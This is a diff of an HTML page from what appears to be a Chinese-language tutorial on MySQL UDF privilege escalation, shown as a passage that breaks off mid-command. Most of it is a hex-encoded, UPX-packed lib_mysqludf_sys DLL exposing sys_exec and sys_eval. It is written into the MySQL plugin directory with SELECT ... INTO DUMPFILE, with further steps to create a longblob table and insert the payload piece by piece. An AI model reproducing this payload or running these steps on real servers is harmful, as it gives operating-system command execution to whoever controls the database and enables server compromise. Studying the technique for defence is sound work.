-<span class="token number">031</span>F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">"C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07</span>
+<span class="hljs-number">031</span>F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 <span class="hljs-keyword">into</span> dumpfile "C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";</code></pre>
 <p>本以为可以顺利做下去了，结果竟然没有plugin目录，这里也很疑惑，明明cmd查询到的，服了，这下得手动创建了（没有那味儿了）</p>
-<p><img src="image-20230925204934434.png" alt="image-20230925204934434"></p>
-<p><img src="image-20230925205014663.png" alt="image-20230925205014663"></p>
-<h5 id="5-1-5-创建一个表并将二进制数据插入到十六进制编码流">5.1.5 创建一个表并将二进制数据插入到十六进制编码流</h5>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925204934434.png" alt="image-20230925204934434"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925205014663.png" alt="image-20230925205014663"></p>
+<h5 id="515-创建一个表并将二进制数据插入到十六进制编码流">5.1.5 创建一个表并将二进制数据插入到十六进制编码流</h5>
 <p>如果在低版本系统环境下（win2003）或部分特殊环境使用mysql命令提示符进行提权操作，由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p>
 <p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用<strong>取四合一</strong>法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p>
-<h5 id="5-1-6-随便选择一个数据库后，创建一个表">5.1.6 随便选择一个数据库后，创建一个表</h5>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> test<span class="token punctuation">;</span>
-<span class="token keyword">create</span> <span class="token keyword">table</span> udf<span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token keyword">longblob</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="image-20230925205239370.png" alt="image-20230925205239370"></p>
+<h5 id="516-随便选择一个数据库后创建一个表">5.1.6 随便选择一个数据库后，创建一个表</h5>
+<pre><code class="hljs sql">use test;
+<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> udf(data longblob);</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925205239370.png" alt="image-20230925205239370"></p>
 <p>这里我是新建了一个数据库</p>
-<p><img src="image-20230925205329215.png" alt="image-20230925205329215"></p>
-<h5 id="5-1-7-insert插入第一段数据">5.1.7 insert插入第一段数据</h5>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925205329215.png" alt="image-20230925205329215"></p>
+<h5 id="517-insert插入第一段数据">5.1.7 insert插入第一段数据</h5>
 <p>当然这里如果你的数据长度恰好的话，直接插入也是可以的</p>
-<pre class="line-numbers language-none"><code class="language-none">insert into udf(data) values (0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010